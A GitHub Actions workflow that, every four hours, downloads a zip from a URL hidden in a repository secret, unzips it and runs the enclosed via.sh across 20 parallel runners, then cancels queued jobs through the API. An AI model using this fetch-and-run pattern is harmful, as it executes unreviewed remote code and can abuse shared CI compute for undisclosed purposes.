name: via

on:
  schedule:
    # Run every 4 hours (at minute 0)
    - cron: "0 */4 * * *"
  workflow_dispatch:

# Ensure only one workflow run executes at a time across the repo.
# New runs will wait (be queued) until the current one finishes.
concurrency:
  group: "via-workflow"
  cancel-in-progress: false

# Allow the cleanup step to cancel jobs (needs 'actions: write').
permissions:
  contents: read
  actions: write

env:
  MAX_WORKERS: "20"

jobs:
  export-and-run:
    runs-on: ubuntu-latest

    # exactly 20 parallel workers per workflow run
    strategy:
      matrix:
        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
      max-parallel: 20

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Download
        shell: bash
        run: |
          curl -fsSL -o via.zip "${{ secrets.VIA }}"
          if [ ! -f "via.zip" ]; then
            echo "Download failed: via.zip not found."
            exit 1
          fi

      - name: Unzip
        shell: bash
        run: |
          unzip -q via.zip
          rm -f via.zip

      - name: Make runner executable
        shell: bash
        run: |
          chmod +x ./via.sh

      - name: Run worker
        shell: bash
        env:
          WORKER_ID: ${{ matrix.worker }}
          MAX_WORKERS: ${{ env.MAX_WORKERS }}
        run: |
          echo "Starting worker $WORKER_ID of $MAX_WORKERS"
          ./via.sh "$WORKER_ID"

  cleanup-queued-jobs:
    runs-on: ubuntu-latest
    # run in parallel with matrix (no needs:)
    steps:
      - name: Wait for scheduling
        run: sleep 10

      - name: Install jq
        run: sudo apt-get update -y && sudo apt-get install -y jq

      - name: Cancel queued jobs (robust)
        env:
          GITHUB_API_URL: https://api.github.com
          REPO: ${{ github.repository }}
          RUN_ID: ${{ github.run_id }}
          TOKEN_GITHUB: ${{ github.token }}
          TOKEN_PAT: ${{ secrets.ACTIONS_PAT || '' }}
        run: |
          set -euo pipefail
          token_to_use="$TOKEN_GITHUB"

          # function to list jobs for the run, returns JSON
          list_jobs() {
            curl -sS -H "Accept: application/vnd.github+json" \
                 -H "Authorization: Bearer $token_to_use" \
                 -H "X-GitHub-Api-Version: 2022-11-28" \
                 "$GITHUB_API_URL/repos/$REPO/actions/runs/$RUN_ID/jobs?per_page=200"
          }

          # Try 3 times to fetch the jobs (small backoff)
          attempt=0
          resp=""
          while [ $attempt -lt 3 ]; do
            attempt=$((attempt+1))
            resp=$(list_jobs) || resp=""
            # crude check if we got JSON with jobs
            if echo "$resp" | jq -e '.jobs' >/dev/null 2>&1; then
              break
            fi
            echo "Attempt $attempt to list jobs failed or returned no jobs; sleeping 3s and retrying..."
            sleep 3
          done

          if [ -z "$resp" ]; then
            echo "Failed to list jobs after retries; aborting cleanup step (no cancels attempted)."
            exit 0
          fi

          total=$(echo "$resp" | jq -r '.total_count // 0')
          echo "total jobs: $total"

          # collect queued jobs that are still queued (and not completed)
          queued_ids=$(echo "$resp" | jq -r '.jobs[] | select(.status == "queued" and (.conclusion == null or .conclusion == "")) | .id')

          if [ -z "$queued_ids" ]; then
            echo "No queued jobs to cancel. Done."
            exit 0
          fi

          echo "Queued job ids to attempt cancel on:"
          echo "$queued_ids"

          # helper to call cancel and return HTTP status and body
          cancel_job() {
            local jid=$1
            http_status=$(curl -sS -w "%{http_code}" -o /tmp/cancel_body.json -X POST \
              -H "Accept: application/vnd.github+json" \
              -H "Authorization: Bearer $token_to_use" \
              -H "X-GitHub-Api-Version: 2022-11-28" \
              "$GITHUB_API_URL/repos/$REPO/actions/jobs/$jid/cancel")
            echo "$http_status"
          }

          # Try canceling each queued job. If we see consistent permission/404 failures,
          # and a PAT secret exists, retry the entire cancel sequence with the PAT.
          failed_ok=0
          any_failed=0
          for jid in $queued_ids; do
            echo "Attempting cancel for job id $jid ..."
            status=$(cancel_job "$jid")
            if [ "$status" = "202" ] || [ "$status" = "204" ]; then
              echo "Cancel request accepted for job $jid (HTTP $status)."
            else
              echo "Cancel request for job $jid returned HTTP $status. Response body:"
              cat /tmp/cancel_body.json || true
              any_failed=1
            fi
          done

          # If any cancel failed and we have a PAT, try again with PAT once
          if [ "$any_failed" -eq 1 ] && [ -n "$TOKEN_PAT" ]; then
            echo "Some cancels failed. Retrying cancels using repo PAT..."
            token_to_use="$TOKEN_PAT"
            # re-list jobs (maybe some changed) and cancel remaining queued ones
            resp2=$(list_jobs)
            queued_ids2=$(echo "$resp2" | jq -r '.jobs[] | select(.status == "queued" and (.conclusion == null or .conclusion == "")) | .id')
            if [ -n "$queued_ids2" ]; then
              for jid in $queued_ids2; do
                echo "Retry cancel with PAT for job id $jid ..."
                status=$(cancel_job "$jid")
                if [ "$status" = "202" ] || [ "$status" = "204" ]; then
                  echo "Cancel accepted for job $jid (HTTP $status)."
                else
                  echo "Cancel returned HTTP $status with body:"
                  cat /tmp/cancel_body.json || true
                fi
              done
            else
              echo "No queued jobs found on retry with PAT."
            fi
          fi

          echo "Cleanup run complete."
